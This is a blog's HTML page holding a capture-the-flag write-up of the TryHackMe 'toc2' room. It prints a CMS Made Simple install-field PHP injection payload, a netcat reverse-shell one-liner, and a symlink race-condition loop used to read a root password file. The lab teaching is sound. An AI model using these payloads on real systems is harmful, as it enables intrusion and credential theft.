@@ -1,0 +1,242 @@
+<!DOCTYPE html>
+<html lang="en">
+    <head>
+        <meta charset="UTF-8">
+<meta http-equiv="X-UA-Compatible" content="ie=edge">
+<meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+<meta name="author" content="">
+<meta name="description" content="https://tryhackme.com/room/toc2
+User Flag First, we use nmap to see what ports are open.
+We notice that ports 22 and 80 are open. Since we hardly have something to explore on SSH, we start by accessing the website.
+Here we collect a username and password (cmsmuser:devpass) and maybe another possible username (Hunter).
+One of the nmap scripts brought us an existing robots.txt entry, so let&amp;rsquo;s check it out.
+Here we find the installation path for cmsms, which is the manager that should be installed in this application, and we also collect the name of the db to be used: cmsmsdb." />
+<meta name="keywords" content="" />
+<meta name="robots" content="noodp" />
+<meta name="theme-color" content="" />
+<link rel="canonical" href="https://b1d0ws.github.io/write-ups/toc2-thm/" />
+
+
+    <title>
+        
+            toc2 - TryHackMe :: b1d0ws 
+        
+    </title>
+
+
+
+<link href="https://cdnjs.cloudflare.com/ajax/libs/flag-icon-css/3.5.0/css/flag-icon.min.css" rel="stylesheet"
+    type="text/css">
+
+
+
+<link rel="stylesheet" href="/main.4e5c639214707eff609bb55fe49e183dee42258a73bc90e4cc7b0a84f900798a.css">
+
+
+
+    <link rel="apple-touch-icon" sizes="180x180" href="/apple-touch-icon.png">
+    <link rel="icon" type="image/png" sizes="32x32" href="/favicon-32x32.png">
+    <link rel="icon" type="image/png" sizes="16x16" href="/favicon-16x16.png">
+    <link rel="manifest" href="/site.webmanifest">
+    <link rel="mask-icon" href="/safari-pinned-tab.svg" color="">
+    <link rel="shortcut icon" href="/favicon.ico">
+    <meta name="msapplication-TileColor" content="">
+
+
+<meta itemprop="name" content="toc2 - TryHackMe">
+<meta itemprop="description" content="https://tryhackme.com/room/toc2
+User Flag First, we use nmap to see what ports are open.
+We notice that ports 22 and 80 are open. Since we hardly have something to explore on SSH, we start by accessing the website.
+Here we collect a username and password (cmsmuser:devpass) and maybe another possible username (Hunter).
+One of the nmap scripts brought us an existing robots.txt entry, so let&rsquo;s check it out.
+Here we find the installation path for cmsms, which is the manager that should be installed in this application, and we also collect the name of the db to be used: cmsmsdb.">
+<meta itemprop="datePublished" content="2022-03-15T10:45:50-03:00" />
+<meta itemprop="dateModified" content="2022-03-15T10:45:50-03:00" />
+<meta itemprop="wordCount" content="653">
+<meta itemprop="image" content="https://b1d0ws.github.io/"/>
+
+
+
+<meta itemprop="keywords" content="" />
+<meta name="twitter:card" content="summary_large_image"/>
+<meta name="twitter:image" content="https://b1d0ws.github.io/"/>
+
+<meta name="twitter:title" content="toc2 - TryHackMe"/>
+<meta name="twitter:description" content="https://tryhackme.com/room/toc2
+User Flag First, we use nmap to see what ports are open.
+We notice that ports 22 and 80 are open. Since we hardly have something to explore on SSH, we start by accessing the website.
+Here we collect a username and password (cmsmuser:devpass) and maybe another possible username (Hunter).
+One of the nmap scripts brought us an existing robots.txt entry, so let&rsquo;s check it out.
+Here we find the installation path for cmsms, which is the manager that should be installed in this application, and we also collect the name of the db to be used: cmsmsdb."/>
+
+
+
+
+    <meta property="og:title" content="toc2 - TryHackMe" />
+<meta property="og:description" content="https://tryhackme.com/room/toc2
+User Flag First, we use nmap to see what ports are open.
+We notice that ports 22 and 80 are open. Since we hardly have something to explore on SSH, we start by accessing the website.
+Here we collect a username and password (cmsmuser:devpass) and maybe another possible username (Hunter).
+One of the nmap scripts brought us an existing robots.txt entry, so let&rsquo;s check it out.
+Here we find the installation path for cmsms, which is the manager that should be installed in this application, and we also collect the name of the db to be used: cmsmsdb." />
+<meta property="og:type" content="article" />
+<meta property="og:url" content="https://b1d0ws.github.io/write-ups/toc2-thm/" />
+<meta property="og:image" content="https://b1d0ws.github.io/"/>
+<meta property="article:published_time" content="2022-03-15T10:45:50-03:00" />
+<meta property="article:modified_time" content="2022-03-15T10:45:50-03:00" /><meta property="og:site_name" content="b1d0ws" />
+
+
+
+
+
+
+    <meta property="article:published_time" content="2022-03-15 10:45:50 -0300 -03" />
+
+
+
+
+
+
+
+
+
+
+    </head>
+
+    
+        <body>
+    
+    
+        <div class="container">
+            <header class="header">
+    <span class="header__inner">
+        <a href="/" style="text-decoration: none;">
+    <div class="logo">
+        
+            <span class="logo__mark"> </span>
+            <span class="logo__text">/home/b1d0ws</span>
+            <span class="logo__cursor" style=
+                  "
+                   
+                   ">
+            </span>
+        
+    </div>
+</a>
+
+
+        <span class="header__right">
+            
+                <nav class="menu">
+    <ul class="menu__inner"><li><a href="/posts/">posts</a></li><li><a href="/whoami/">whoami</a></li><li><a href="/write-ups/">write-ups</a></li>
+    </ul>
+</nav>
+
+                <span class="menu-trigger">
+                    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24">
+                        <path d="M0 0h24v24H0z" fill="none"/>
+                        <path d="M3 18h18v-2H3v2zm0-5h18v-2H3v2zm0-7v2h18V6H3z"/>
+                    </svg>
+                </span>
+            
+        </span>
+    </span>
+</header>
+
+
+            <div class="content">
+                
+    <main class="post">
+
+        <div class="post-info">
+            
+            </p>
+        </div>
+
+        <article>
+            <h2 class="post-title"><a href="https://b1d0ws.github.io/write-ups/toc2-thm/">toc2 - TryHackMe</a></h2>
+
+            
+            
+            
+
+            <div class="post-content">
+                <p><a href="https://tryhackme.com/room/toc2">https://tryhackme.com/room/toc2</a></p>
+<h2 id="user-flag"><strong>User Flag</strong></h2>
+<p>First, we use nmap to see what ports are open.</p>
+<p><img src="/toc2/nmap-toc2.png" alt="nmap-toc2"></p>
+<p>We notice that ports 22 and 80 are open. Since we hardly have something to explore on SSH, we start by accessing the website.</p>
+<p><img src="/toc2/site-toc2.png" alt="site-toc2"></p>
+<p>Here we collect a username and password (<em>cmsmuser:devpass</em>) and maybe another possible username (<em>Hunter</em>).</p>
+<p>One of the nmap scripts brought us an existing <em>robots.txt</em> entry, so let&rsquo;s check it out.</p>
+<p><img src="/toc2/robots-toc2.png" alt="robots-toc2"></p>
+<p>Here we find the installation path for cmsms, which is the manager that should be installed in this application, and we also collect the name of the db to be used: <em>cmsmsdb</em>.</p>
+<p><img src="/toc2/cmsms-toc2.png" alt="cmsms-toc2"></p>
+<p>By accessing the indicated directory, we can proceed with the installation of the system.
+First of all, since we can check the version used, let&rsquo;s look for any known vulnerabilities in cmsms 2.1.6.</p>
+<p>As soon as we search, we already get a Remote Code Execution exploit. Perfect!<br>
+<a href="https://www.exploit-db.com/exploits/44192">https://www.exploit-db.com/exploits/44192</a></p>
+<p><img src="/toc2/exploit-toc2.png" alt="exploit-toc2"></p>
+<p>Following the exploit, we notice that it already starts to be exploited when installing the manager itself.</p>
+<p>To perform the installation, we enter the data collected earlier. Before proceeding to the next step, we intercept this request and enter the payload <em>junk&rsquo;;echo%20system($_GET[&lsquo;cmd&rsquo;]);$junk='junk</em> in the UTC field.</p>
+<p><img src="/toc2/database-toc2.png" alt="database-toc2"></p>
+<p><img src="/toc2/cmsms2-toc2.png" alt="burpsuite-toc2"></p>
+<p>Now we access the address <em>http://10.10.169.35/cmsms/config.php?cmd=id;uname</em> and notice that the command entered in the cmd parameter is executed on the victim host and returned to us.</p>
+<p><img src="/toc2/cmsms2-cmd-toc2.png" alt="cmd-execution-toc2"></p>
+<p>Since we can run remote commands, we can try a reverse shell.</p>
+<p>I used the payload <em>rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&gt;&amp;1|nc 10.2.117.185 3333 &gt;/tmp/f</em> encoded to URL.</p>
+<p><img src="/toc2/initial-access-toc2.png" alt="first-access-toc2"></p>
+<p>When I first got access to the machine I used python to get a stable shell, but this is not necessary since we got frank&rsquo;s password from the file <em>new_machine.txt</em> located in his home folder to make a ssh connection.</p>
+<p>There we also get the user flag!</p>
+<p><img src="/toc2/user-txt-toc2.png" alt="user-txt-toc2"></p>
+<h2 id="root-flag">Root Flag</h2>
+<p>On frank&rsquo;s home we notice an interesting directory called <em>root_access</em>. Inside it we have a c file, an executable and a text file that only the root user is allowed to read.</p>
+<p>When reading the c file to understand what the executable does, we realize that it is used to read files, but only files that the user running it has permission to read.</p>
+<p>Probably our mission is to use <em>readcreads</em> to read the file <em>root_password_backup</em> and get root&rsquo;s password.</p>
+<p><img src="/toc2/readcreds-toc2.png" alt="readcreds-toc2"></p>
+<p>I spent some time trying to figure out how to exploit this program until I took a look at the hint offered by the CTF. In the github located in the hint, we noticed that it is a <em>race condition vulnerability</em>.</p>
+<p>Researching a bit, I came across <a href="https://samsclass.info/127/proj/E10.htm">this link</a> that talks about exploiting programs that use the <em>access()</em> function and also have some <em>time interval</em> before the time of usage.</p>
+<p>The article shows exactly how to exploit this vulnerability. We create a file to which we have read access. Then we create a symbolic link called flip pointing to this file. When trying to read the symbolic link we are able to use readcreds correctly.</p>
+<p>I then point the flip to root_password_backup just for a test case. Trying to read &ldquo;flip&rdquo; with readcreds logically returns an error.</p>
+<p><img src="/toc2/root-flag-toc2.png" alt="root-flag1-toc2"></p>
+<p>Now we will actually explore this race condition. First, we create a loop with this command:
+<em>while true; do ln -sf root_password_backup flip; ln -sf public flip; done &amp;</em></p>
+<p>This command will constantly change the symbolic link between the file we have access to and the file with the root password.</p>
+<p>Then we run a loop to execute the program multiple times by reading the symbolic link with this command: <em>for i in {1&hellip;30}; do ./readcreds flip; done</em></p>
+<p>The trick here is that at some point the program will do a condition check with the permissions on the public file, and when it reads the &ldquo;flip&rdquo; file, the symbolic link will have already been changed and will be pointing to root_password_backup.</p>
+<p><img src="/toc2/root2-flag-toc2.png" alt="root-flag2-toc2"></p>
+<p>If you want to understand more about this race condition vulnerability, you can watch <a href="https://www.youtube.com/watch?v=5g137gsB9Wk">this video</a>.</p>
+<p>See ya =).</p>
+
+            </div>
+        </article>
+
+        <hr />
+
+        <div class="post-info">
+            
+            
+  		</div>
+    </main>
+
+            </div>
+
+            
+                <footer class="footer">
+    
+    
+</footer>
+
+            
+        </div>
+
+        
+
+
+
+<script type="text/javascript" src="/bundle.min.ace63d93098bf623f7c286a9084a4c22bfc482944c734f87fe0b685c7c6c7fa0ad2edb028c3b4b60d3343720c8ab490b320ad7f8edf4f6e9a6b898fc529057a9.js" integrity="sha512-rOY9kwmL9iP3woapCEpMIr/EgpRMc0&#43;H/gtoXHxsf6CtLtsCjDtLYNM0NyDIq0kLMgrX&#43;O309ummuJj8UpBXqQ=="></script>
+
+
+
+    </body>
+</html>
